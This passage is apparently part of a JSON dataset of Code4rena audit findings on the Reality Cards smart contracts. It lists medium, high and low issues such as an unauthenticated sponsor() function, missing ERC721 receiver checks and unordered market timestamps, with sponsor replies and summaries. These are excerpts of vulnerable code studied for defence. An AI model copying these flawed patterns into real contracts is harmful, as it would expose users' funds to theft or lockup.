      "content": "_Submitted by [cmichel](https://twitter.com/cmichelio), also found by [0xRajeev](https://twitter.com/0xRajeev)_\n\nThe `RCNftHubL2.safeTransferFrom` function does not correctly implement the ERC721 spec:\n> When using `safeTransferFrom`, the token contract checks to see that the receiver is an IERC721Receiver, which implies that it knows how to handle ERC721 tokens. [ERC721](https://docs.openzeppelin.com/contracts/2.x/api/token/erc721#IERC721-safeTransferFrom)\n\nThis check is not implemented, it just drops the `_data` argument.\n\nContracts that don't know how to handle ERC721 tokens (are not an `IERC721Receiver`) can accept them but they should not when using `safeTransferFrom` according to spec.\n\nRecommend Implementing the `IERC721Receiver` check in `safeTransferFrom`.\n\n**[Splidge (Reality Cards) confirmed and resolved](https://github.com/code-423n4/2021-06-realitycards-findings/issues/160#issuecomment-865141409):**\n > This has been fixed while working on issue #118\n> commit [here](https://github.com/RealityCards/RealityCards-Contracts/commit/a628ac8e0132f7ca4159980f791ae820100c0888)\n\n",
      "summary": "\nThe `RCNftHubL2.safeTransferFrom` function in the ERC721 token contract is not properly checking if the receiver is an `IERC721Receiver`, which is required by the ERC721 spec. This means that contracts that do not know how to handle ERC721 tokens can still accept them, which goes against the spec. The reporter recommends implementing the `IERC721Receiver` check in `safeTransferFrom`. The bug has been confirmed and resolved by the project team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/160",
      "tags": [],
      "finders": []
    },
    {
      "id": "42231",
      "title": "[M-10] Missing call to `removeOldBids` may affect foreclosure",
      "impact": "MEDIUM",
      "content": "_Submitted by [0xRajeev](https://twitter.com/0xRajeev)_\n\n`Orderbook.removeBids()` as commented:\n```\n///remove bids in closed markets for a given user\n///this can reduce the users `bidRate` and chance to foreclose\n```\n\n\n`removeOldBids()` is performed currently in `Market.newRental()` and `Treasury.deposit()` to  “do some cleaning up, it might help cancel their foreclosure” as commented. However, this is missing in the `withdrawDeposit()` function where the need is the most because user is removing deposit which may lead to foreclosure and is even commented as being useful on L356.\n\nThe impact is that, if we do not remove closed market bids during withdrawDeposit, the closed market bids still get accounted in user's `bidRate` in the conditional on L357 and therefore do not prevent the foreclosure in `withdrawDeposit` that may happen in L357-L367. User may get foreclosed because of mis-accounted closed-market bids in the order book.\n\nRecommend adding call to `removeOldBids()` on L355 of `withdrawDeposit()` of Treasury.\n\n**[Splidge (Reality Cards) confirmed but disagreed with severity and then resolved](https://github.com/code-423n4/2021-06-realitycards-findings/issues/109#issuecomment-864960734):**\n > This was intentionally left out in an older version of the contracts because of the way `withdrawDeposit` worked before we had the per-user rent collection.\n> Added it back in again [here](https://github.com/RealityCards/RealityCards-Contracts/commit/93e80368cc1d5f0ea6b397c5733af40ee7100a0b).\n\n",
      "summary": "\nThe bug report discusses an issue with the `removeBids()` function in the Reality Cards smart contracts. This function is meant to remove bids in closed markets for a given user, reducing their chance of foreclosure. However, the function is missing in the `withdrawDeposit()` function, which is where it is most needed. This means that closed market bids are still being accounted for in a user's `bidRate`, which can lead to foreclosure. The report recommends adding a call to the `removeOldBids()` function in the `withdrawDeposit()` function to resolve this issue. The issue was confirmed and resolved by Splidge from Reality Cards, who explained that the function was intentionally left out in an older version of the contracts but has since been added back in.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/109",
      "tags": [],
      "finders": []
    },
    {
      "id": "42230",
      "title": "[M-09] Deposit whitelist enforced on `msg.sender` instead of user",
      "impact": "MEDIUM",
      "content": "_Submitted by [0xRajeev](https://twitter.com/0xRajeev)_\n\nThe Treasury `deposit()` function credits amount to the user address in parameter instead of the `msgSender()` function that is actually making the deposit with the rationale (as explained in the Natspec comment) being that this may be called via contract or L1-L2 bot.\n\nHowever, the deposit whitelist should ideally be enforced on the `_user` address. If `msgSender()` is blacklisted, user address can still `deposit()` from another whitelisted `msgSender()` address while retaining the user address that is used for leader boards and NFTs.\n\nThe impact of this is that even if the user misbehaves in interactions with the system (e.g. trolls, spams) and their corresponding `msgSender()` is removed from the whitelist. The user can continue to deposit into the system via another whitelisted `msgSender()` without any impact to leader boards or NFTs.\n\nRecommend using whitelist on user address instead of `msgSender()`.\n\n**[Splidge (Reality Cards) disputed and disagreed with severity](https://github.com/code-423n4/2021-06-realitycards-findings/issues/107#issuecomment-864043844):**\n > It is stated that the whitelist will \"only allow certain addresses to deposit\" [here ](https://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L70)and that toggleWhitelist() allows an address to deposit [here](https://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L204).\n>\n> I think that the whitelist is performing as intended, but thanks for this issue report as this could easily have been a larger issue.\n>\n> We only plan to use the whitelist as a very rudimentary barrier just for the initial launch. I think that only allowing certain addresses to deposit is sufficient for now. Maybe if time allows I'll make the changes but changing the whitelist to allow the `_user` instead of the `msgSender()` would also block contracts and layer1->layer2 bot, so there'd need to be exceptions made for them. I'd rather not play about with sensitive functions at the last minute when we aren't going to be using the whitelist much anyway.\n\n**[dmvt (Judge) commented](https://github.com/code-423n4/2021-06-realitycards-findings/issues/107#issuecomment-877673092):**\n > Warden makes a good point. This could allow griefing of other parts of the system. If the barrier winds up being needed longer than expected or users act in unexpected ways, sponsor may wind up wishing they had reconsidered addressing this. Obviously, sponsor is free to ignore, but the issue seems to be a valid one with significant potential impact.\n\n",
      "summary": "\nThis bug report highlights an issue with the Treasury `deposit()` function in the Reality Cards contract. Currently, the function credits the amount to the user address in the parameter instead of the `msgSender()` function, which is actually making the deposit. This could potentially allow users to continue depositing even if their `msgSender()` address is removed from the whitelist, causing issues with leader boards and NFTs. The recommended solution is to enforce the whitelist on the user address instead of the `msgSender()` address. However, there is some disagreement among team members about the severity of this issue and the need for immediate action. The Judge has also commented on the potential impact of this bug and the sponsor's decision to address it. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/107",
      "tags": [],
      "finders": []
    },
    {
      "id": "42229",
      "title": "[M-07] `maxSumOfPrices` check is broken",
      "impact": "MEDIUM",
      "content": "_Submitted by [0xRajeev](https://twitter.com/0xRajeev)_\n\n`rentAllCards()` requires the sender to specify a `_maxSumOfPrices` parameter which specifies “limit to the sum of the bids to place” as specified in the Natspec @param comment. This is apparently for front-run protection.\n\nHowever, this function parameter constraint for `_maxSumOfPrices` is broken in the function implementation which leads to the total number of bids placed greater than the `_maxSumOfPrices` specified.\n\nThe impact of this is that the user may not have sufficient deposited, be foreclosed upon and/or impacted on other bids/markets.\n\nScenario: Assume two cards for a market with current winning rentals of 50 each. `_maxSumofPrices` = 101 passes check on L643 but then the forced 10% increase on L650 (assuming sender is not the owner of either card) causes `newRentals` to be called with 55 for each card thus totalling to 110 which is > 101 as requested by the user.\n\nRecommend modifing the max sum of prices check logic to consider the 10% increase scenarios. Document and suggest the max sum of prices for the user in the UI based on the card prices and 10% requirement depending on card ownership.\n\n**[Splidge (Reality Cards) confirmed and resolved](https://github.com/code-423n4/2021-06-realitycards-findings/issues/87#issuecomment-864947965):**\n > fixed [here](https://github.com/RealityCards/RealityCards-Contracts/commit/10dfc77977f19fd4c233eb294ebc566526be9546)\n\n",
      "summary": "\nThe function `rentAllCards()` requires a parameter called `_maxSumOfPrices` to limit the total bids placed, but this constraint is not properly implemented. This can lead to the total bids being greater than the specified limit, causing issues for the user such as not having enough funds and impacting other bids. The suggested solution is to modify the check logic and document the max sum of prices for the user in the UI. This issue has been confirmed and resolved by Splidge from Reality Cards.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/87",
      "tags": [],
      "finders": []
    },
    {
      "id": "42228",
      "title": "[M-06] Possible locked-ether (funds) Issue in `RCOrderbook.sol`",
      "impact": "MEDIUM",
      "content": "_Submitted by maplesyrup ([heiho1](https://github.com/heiho1) and [thisguy__](https://twitter.com/eriksal1217))_\n\nWhen running the analyzer code, the following functions were found in `RCOrderbook.sol` to possibly lock funds due to it being a payable function with no withdraw function associated. See [Issue #43](https://github.com/code-423n4/2021-06-realitycards-findings/issues/43) for more details.\n\n**[Splidge (Reality Cards) confirmed initially and then disputed](https://github.com/code-423n4/2021-06-realitycards-findings/issues/43#issuecomment-861332540):**\n > I initially confirmed this because we aren't using the native currency on Matic/Polygon. However I think this should be disputed mainly because this function is used to call other functions which might be payable, although I admit currently we don't have payable functions, we might add them in the future.\n> This library is used across all our contracts, had we put a payable function in the Treasury for instance, would this be considered a flaw to have this same library imported into the Orderbook?\n\n**[Splidge (Reality Cards) commented](https://github.com/code-423n4/2021-06-realitycards-findings/issues/43#issuecomment-861566988):**\n > Note that the duplicate issue #51 was submitted by the same user.\n\n**[dmvt (Judge) commented](https://github.com/code-423n4/2021-06-realitycards-findings/issues/43#issuecomment-877652563):**\n > Agree with the sponsor's explanation, but the issue exists regardless. Adding a way to retrieve locked funds would mitigate the issue.\n\n",
      "summary": "\nThe report is about a potential issue found in the `RCOrderbook.sol` code when running the analyzer. The code contains a function that can lock funds without a way to withdraw them, which could be problematic. The issue was initially confirmed, but then disputed, and it was noted that a similar issue had been reported by the same user. A judge agreed with the sponsor's explanation, but still suggested adding a way to retrieve locked funds to mitigate the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/43",
      "tags": [],
      "finders": []
    },
    {
      "id": "42227",
      "title": "[M-05] `RCFactory.createMarket()` does not enforce `_timestamps` and `_timestamps` being larger than `_timestamps`, even though proper functioning requires them to be so",
      "impact": "MEDIUM",
      "content": "_Submitted by [jvaqa](https://twitter.com/jvaqa), also found by [0xRajeev](https://twitter.com/0xRajeev), [paulius.eth](https://twitter.com/SolidityDev) and [shw](https://github.com/x9453)_\n\n`RCFactory.createMarket()` does not enforce `_timestamps`[1] and `_timestamps`[2] being larger than `_timestamps`[0], even though proper functioning requires them to be so.\n\n`IRCMarket` defines a sequence of events that each market should progress through sequentially, CLOSED, OPEN, LOCKED, WITHDRAW. ([1](https://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/interfaces/IRCMarket.sol#L7))\n\nThe comments explicitly state that `_incrementState()` should be called \"thrice\" ([2](https://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCMarket.sol#L1093))\n\nHowever, it is possible to create a market where these events do not occur sequentially.\n\nYou can create a market where the `marketOpeningTime` is later than the `marketLockingTime` and `oracleResolutionTime`.\n\nThis is because although `RCFactory` checks to ensure that `_timestamps[2]` is greater than `_timestamps[1]`, it does not check to ensure that `_timestamps[1]` is greater than `_timestamps[0]` ([3](https://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCFactory.sol#L539))\n\nThis is also because although RCFactory checks to ensure that `_timestamps[0]` is equal to or greater than `block.timestamp`, it makes no check for a minimum value for `_timestamps[1]` or `_timestamps[2]`, or a relative check between the value of `_timestamps[0]` and `_timestamps[1]`. ([4](https://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCFactory.sol#L521))\n\nThus, you can create a market where the `marketLockingTime` and the `oracleResolutionTime` occur before the `marketOpeningTime`.\n\nWhen calling `RCFactory.createMarket()`, Alice can supply 0 as the argument for `_timestamps[1]` and `_timestamps[2]`, and any value equal to or greater than `block.timestamp` for `_timestamps[0]` ([5](https://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCFactory.sol#L468))\n\nRecommend adding the following check to `RCFactory.createMarket()`:\n```solidity\nrequire(\n    _timestamps[0] < _timestamps[1],\n    \"market must begin before market can lock\"\n);\n```\n\n**[Splidge (Reality Cards) confirmed and resolved](https://github.com/code-423n4/2021-06-realitycards-findings/issues/61#issuecomment-864930732):**\n > Implemented [here](https://github.com/RealityCards/RealityCards-Contracts/commit/e47c6d845360166620dc014657d95d7180185c77)\n\n",
      "summary": "\nThe bug report addresses an issue with the `RCFactory.createMarket()` function in the Reality Cards project. This function is responsible for creating markets, which are a sequence of events that each market should progress through sequentially. However, the function does not properly enforce the order of these events, which can lead to unexpected behavior. Specifically, the function does not check to ensure that certain timestamps are in the correct order, which can result in a market being created where the events occur out of sequence. This can be exploited by supplying certain values for the timestamps when calling the function. The report recommends adding a check to ensure that the timestamps are in the correct order, which has since been implemented by the project team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/61",
      "tags": [],
      "finders": []
    },
    {
      "id": "42226",
      "title": "[M-04] `minRentalDayDivisor` can be different between markets and treasury",
      "impact": "MEDIUM",
      "content": "_Submitted by [gpersoon](https://twitter.com/gpersoon), also found by maplesyrup ([heiho1](https://github.com/heiho1) and [thisguy__](https://twitter.com/eriksal1217)) and [paulius.eth](https://twitter.com/SolidityDev)_\n\nThe `minRentalDayDivisor` is defined in `RCTreasury.sol` and copied to each market.\nThe `minRentalDayDivisor` can be updated via `setMinRental`, but then it isn't updated in the already created market.\n\nTo calculate the minimum rent time, in function `withdrawDeposit` of `RCTreasury.sol`, the latest version of `minRentalDayDivisor` is used, which could be different than the values in the market.\nSo the markets will calculate the minimum rent time different.\nThis could lead to unexpected results\n```solidity\nfunction initialize(\n     ...\n        minRentalDayDivisor = treasury.minRentalDayDivisor();\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCTreasury.sol#L322\n function withdrawDeposit(uint256 _amount, bool _localWithdrawal)\n...\n  require( user[_msgSender].bidRate == 0 || block.timestamp - (user[_msgSender].lastRentalTime) > uint256(1 days) / minRentalDayDivisor, \"Too soon\");\n..\n if ( user[_msgSender].bidRate != 0 &&  user[_msgSender].bidRate / (minRentalDayDivisor) >  user[_msgSender].deposit ) {\n..\n\n// https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCTreasury.sol#L169\n  function setMinRental(uint256 _newDivisor) public override onlyOwner {\n        minRentalDayDivisor = _newDivisor;\n    }\n```\n\nRecommend either accepting or at least documenting the risk of change to code to prevent this from happening.\n\n**[Splidge (Reality Cards) acknowledged](https://github.com/code-423n4/2021-06-realitycards-findings/issues/31#issuecomment-861301786):**\n > Yes, This became apparent recently when we changed the `minRentalDayDivisor` during a beta test.\n> Ideally this value is never changed and if it is changed then it will be done very infrequently.\n> The main protection `minRentalDayDivisor` offers is against a DoS attack whereby an attacker gains some ownership time on a card and then will fill the orderbook with bids using sybil accounts (withdrawing almost all deposit after placing the bids), without `minRentalDayDivisor` these low value (but legitimate) bids would prevent other users from gaining ownership of the card (due to gas limits there's a limit to the rental collections we can perform) and give the attacker a greater share of the prize pot. The benefit of `minRentalDayDivisor` is that now these are zero value bids which are eligible for immediate deletion, and so there is now more of a cost to the attack which scales with the cost of the rental prices (which will closely be linked to the value of the prize pot). To this end `minRentalDayDivisor` is at it's most useful in the Treasury where it's main purpose is fulfilled in `withdrawDeposit()`, the usage in the markets is less beneficial and wasn't considered worth the extra gas usage to have the Markets fetch the updated value given the infrequency we will be changing it.\n> We have accepted this risk.\n\n**[dmvt (Judge) upgraded severity from 1 to 2](https://github.com/code-423n4/2021-06-realitycards-findings/issues/31#issuecomment-877275766):**\n > Updating to Medium risk to match the other reporting wardens: \"Possible accidental loss of funds or information due to code manipulation or bad side effects of not properly outlining a payable function\"\n\n",
      "summary": "\nThe bug report discusses an issue with the `minRentalDayDivisor` variable in the Reality Cards project. This variable is used to calculate the minimum rent time for cards in the project. The problem is that when the variable is updated, it is not updated in already created markets. This can lead to unexpected results and potential loss of funds. The developers have acknowledged this issue and have accepted the risk, but it has been upgraded to a medium risk due to the potential loss of funds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/31",
      "tags": [],
      "finders": []
    },
    {
      "id": "42225",
      "title": "[M-03] Missing `balancedBooks` modifier could result in failed system insolvency detection",
      "impact": "MEDIUM",
      "content": "_Submitted by [0xRajeev](https://twitter.com/0xRajeev), also found by [gpersoon](https://twitter.com/gpersoon) and [paulius.eth](https://twitter.com/SolidityDev)_\n\nThe `balancedBooks` modifier is used to “check that funds haven't gone missing during this function call” and is applied to `deposit`, `withdrawDeposit`, `payRent`, `payout` and `sponsor Treasury` functions which move funds in and out of the Treasury or adjust its market/user balances.\n\nHowever, this modifier is missing in the `refundUser()` and `topupMarketBalance()` functions which also perform similar actions. The impact is that any miscalculations in these functions will lead to the system becoming insolvent.\n\nRecommend adding modifier to the two functions above where it is missing.\n\n**[Splidge (Reality Cards) confirmed and resolved in a duplicate issue](https://github.com/code-423n4/2021-06-realitycards-findings/issues/23#issuecomment-864906080):**\n> implemented [here](https://github.com/RealityCards/RealityCards-Contracts/commit/6bb7b729fdc6f58a4b39c20ad3b24a61b5946cdf)\n\n_**Note:** Additional conversation regarding this vulnerability can be found [here](https://github.com/code-423n4/2021-06-realitycards-findings/issues/23)_\n\n",
      "summary": "\nThe bug report is about a missing modifier in two functions, `refundUser()` and `topupMarketBalance()`, in the `balancedBooks` modifier. This modifier is used to ensure that funds are not lost when moving them in and out of the Treasury or adjusting balances. However, these two functions were not included in the modifier, which could lead to miscalculations and make the system insolvent. The bug has been confirmed and resolved by the developers.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/112",
      "tags": [],
      "finders": []
    },
    {
      "id": "42224",
      "title": "[M-02] Critical `uberOwner` address changes should be a two-step process",
      "impact": "MEDIUM",
      "content": "_Submitted by [0xRajeev](https://twitter.com/0xRajeev), also found by [gpersoon](https://twitter.com/gpersoon) and [a_dlamo](https://twitter.com/a_delamo)._\n\nAs specified, `uberOwners` of `Factory`, `Orderbook` and `Treasury` have the highest privileges in the system because they can upgrade contracts of `market`, `Nfthub`, `order book`, `treasury`, `token` and `factory` which form the critical components of the protocol.\n\nThe contracts allow for `uberOwners` to be changed to a different address from the contract owner/deployer using the `changeUberOwner()` function which is callable by the current `uberOwner`. While this function checks for zero-address, there is no validation of the new address being correct. If the current `uberOwner` incorrectly uses an invalid address for which they do not have the private key, then the system gets locked because the `uberOwner` cannot be corrected and none of the other functions that require `uberOwner` caller can be executed.\n\nImpact: The current `uberOwner` uses a non-zero but incorrect address as the new `uberOwner`. This gets set and now the system is locked and none of the `uberOwner`-only callable functions are callable. This error cannot be fixed either and will require redeployment of contracts which will mean that all existing markets have to be terminated. The system will have to be shut and restarted completely from scratch which will take a reputation hit and have a serious technical and business impact.\n\nRecommend changing the single-step change of `uberOwner` address to a two-step process where the current `uberOwner` first approves a new address as a `pendingUberOwner`. That `pendingUberOwner` has to then claim the ownership in a separate transaction which cannot be done if they do not have the correct private key. An incorrectly set `pendingUberOwner` can be reset by changing it again to the correct one who can then successfully claim it in the second step.\n\n**[Splidge (Reality Cards) marked as duplicate](https://github.com/code-423n4/2021-06-realitycards-findings/issues/105#issuecomment-863299789):**\n > Duplicate of #5\n\n**[dmvt (Judge) commented](https://github.com/code-423n4/2021-06-realitycards-findings/issues/105#issuecomment-877187804):**\n > There is a very low probability coupled with a very high impact, making this a Medium risk issue in my opinion.\n\n _**Note:** Additional conversation regarding this vulnerability can be found [here](https://github.com/code-423n4/2021-06-realitycards-findings/issues/5)_\n\n",
      "summary": "\nThis bug report is about a vulnerability found in a system by three people. The system has a feature called `uberOwners` that allows for certain contract upgrades. However, there is a problem with the `changeUberOwner()` function which can lock the system if an incorrect address is used. This can have serious consequences and may require the system to be restarted from scratch. The recommendation is to change the process to a two-step process to prevent this issue. This bug has been marked as a duplicate of a previous report and is considered a medium risk with low probability but high impact. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/105",
      "tags": [],
      "finders": []
    },
    {
      "id": "42223",
      "title": "[M-01] payout doesn't fix `isForeclosed` state",
      "impact": "MEDIUM",
      "content": "_Submitted by [gpersoon](https://twitter.com/gpersoon)_\n\nThe function payout of `RCTreasury.sol` doesn't undo the `isForeclosed` state of a user.\nThis would be possible because with a payout a user will receive funds so he can lose his `isForeclosed` status.\n\nFor example the function `refundUser` doesn't check and update the `isForeclosed` status in `RCTreasury` [on L429](https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCTreasury.sol#L429) and [line 447](https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCTreasury.sol#L447).\n\nRecommend checking and updating the `isForeclosed` state in the payout function.\n\n**[Splidge (Reality Cards) confirmed and suggested upgrading from 0 to 2 severity](https://github.com/code-423n4/2021-06-realitycards-findings/issues/28#issuecomment-860740403):**\n > The severity of this could be increased as a user might have believed that the payout would cancel their foreclosure.\n> This could at a push count as 2 (Medium risk)  because the \"availability could be impacted\" as in the definition [here](https://docs.code4rena.com/roles/wardens/judging-criteria). This is because the user wouldn't be allowed to place new bids without calling some other function that will cancel their foreclosure first.\n\n**[dmvt (Judge) agreed with sponsor and upgraded from 0 to 2 severity](https://github.com/code-423n4/2021-06-realitycards-findings/issues/105#issuecomment-877187804):**\n\n**[Splidge (Reality Cards) resolved](https://github.com/code-423n4/2021-06-realitycards-findings/issues/28#issuecomment-864907763):**\n > Fixed [here](https://github.com/RealityCards/RealityCards-Contracts/commit/9f179daf5a7b0a6256feba3648456650fedf4994)\n\n",
      "summary": "\nThis bug report is about a problem with the function called payout in a file called RCTreasury.sol. This function is not properly updating the status of a user called isForeclosed. This means that a user who receives funds through the payout may still be considered foreclosed, even though they should no longer be in that state. This could cause issues for users trying to place new bids. The severity of this bug was initially rated as 0, but it was later upgraded to a 2 (medium risk) due to the impact it could have on user availability. The bug has since been resolved by the sponsor.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/28",
      "tags": [],
      "finders": []
    },
    {
      "id": "42222",
      "title": "[H-03] anyone can call function `sponsor`",
      "impact": "HIGH",
      "content": "_Submitted by [paulius.eth](https://twitter.com/SolidityDev), also found by [0xRajeev](https://twitter.com/0xRajeev), [cmichel](https://twitter.com/cmichelio), and [shw](https://github.com/x9453)_\n\nThis function `sponsor` should only be called by the factory, however, it does not have any auth checks, so that means anyone can call it with an arbitrary `_sponsorAddress` address and transfer tokens from them if the allowance is > 0:\n```solidity\n    /// @notice ability to add liqudity to the pot without being able to win.\n    /// @dev called by Factory during market creation\n    /// @param _sponsorAddress the msgSender of createMarket in the Factory\n    function sponsor(address _sponsorAddress, uint256 _amount)\n        external\n        override\n    {\n        _sponsor(_sponsorAddress, _amount);\n    }\n```\n\nRecommend checking that the sender is a factory contract.\n\n**[Splidge (Reality Cards) confirmed](https://github.com/code-423n4/2021-06-realitycards-findings/issues/40#issuecomment-861313681):**\n > This is a good one!\n\n**[mcplums (Reality Cards) commented](https://github.com/code-423n4/2021-06-realitycards-findings/issues/40#issuecomment-864040541):**\n > Yeah this is massive one!! Thanks @pauliax :)\n\n\n**[Splidge (Reality Cards) resolved](https://github.com/code-423n4/2021-06-realitycards-findings/issues/40#issuecomment-864915074):**\n > fixed [here](https://github.com/RealityCards/RealityCards-Contracts/commit/a234524ea563b00c67c6ac618e426a1354b75c93)\n\n",
      "summary": "\nThe reported bug is in the function `sponsor` of the Reality Cards contract. This function is meant to be called only by the factory, but it does not have any authorization checks. This means that anyone can call this function with a specific address and transfer tokens from them if they have an allowance greater than 0. The recommended solution is to check that the sender is a factory contract. This bug was confirmed by Splidge from Reality Cards and has been resolved by the team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/40",
      "tags": [],
      "finders": []
    },
    {
      "id": "4112",
      "title": "[M-15] Deposits don’t work with fee-on transfer tokens",
      "impact": "MEDIUM",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\n## Vulnerability Details\n\nThere are ERC20 tokens that may make certain customizations to their ERC20 contracts.\nOne type of these tokens is deflationary tokens that charge a certain fee for every `transfer()` or `transferFrom()`.\n\n\n## Impact\n\nThe `deposit()` function will introduce unexpected balance inconsistencies when comparing internal asset records with external ERC20 token contracts.\n\n## Recommended Mitigation Steps\n\n One possible mitigation is to measure the asset change right before and after the asset-transferring routines",
      "summary": "\nThis bug report is about ERC20 tokens that may have certain customizations, such as deflationary tokens that charge a fee for every transfer. This could lead to unexpected balance inconsistencies when comparing the asset records with the external ERC20 token contracts. To mitigate this issue, it is recommended to measure the asset change right before and after the asset-transferring routines.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/152",
      "tags": [
        "Fee On Transfer"
      ],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "332",
      "title": "[L-25] The domainSeperator is not recalculated after a hard fork happens",
      "impact": "LOW",
      "content": "## Handle\n\nshw\n\n\n## Vulnerability details\n\n## Impact\n\nThe variable `domainSeperator` in `EIP712Base` is cached in the contract storage and will not change after the contract is initialized. However, if a hard fork happens after the contract deployment, the `domainSeperator` would become invalid on one of the forked chains due to the `block.chainid` has changed.\n\n## Proof of Concept\n\nReferenced code:\n[EIP712Base.sol#L25-L44](https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/lib/EIP712Base.sol#L25-L44)\n\n## Recommended Mitigation Steps\n\nConsider using the [implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/draft-EIP712.sol) from OpenZeppelin, which recalculates the domain separator if the current `block.chainid` is not the cached chain ID.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/166",
      "tags": [],
      "finders": [
        "shw"
      ]
    },
    {
      "id": "331",
      "title": "[L-24] Dangerous toggle functions",
      "impact": "LOW",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\n## Vulnerability Details\n\nUsually one tries to avoid toggle functions in blockchains, because it could be that you think that the first transaction you sent was not correctly submitted (but it's just pending for a long time), or you might even be unaware that it was already sent if multiple roles can set it (like with `changeMarketApproval` / `onlyGovernors`) or if it's an msig.\nThis results in potentially double-toggling the state, i.e, it is set to the initial value again.\n\nSome example functions: `changeMarketCreationGovernorsOnly`, `changeMarketApproval`, and the ones that follow.\n\n## Impact\n\nThe outcome of toggle functions is hard to predict on blockchains due to the very async nature and lack of information about pending transactions.\n\n## Recommended Mitigation Steps\n\nUse functions that accept a specific value as a parameter instead.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/157",
      "tags": [],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "330",
      "title": "[L-23] uberOwner cannot do all the things an owner can",
      "impact": "LOW",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\n## Vulnerability Details\n\nThe `uberOwner` cannot do the same things the owner can.\nThey can \"only\" set the reference contract for the market.\n\nThe same ideas apply to `Treasury` and `Factory`'s `uberOwner`.\n\n## Impact\n\nThe name is misleading as it sounds like the uber-owner is more powerful than the owner.\n\n## Recommended Mitigation Steps\n\nUberowner should at least be able to set the owner if not be allowed to call all functions that an `owner` can.\nAlternatively, rename the `uberOwner`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/156",
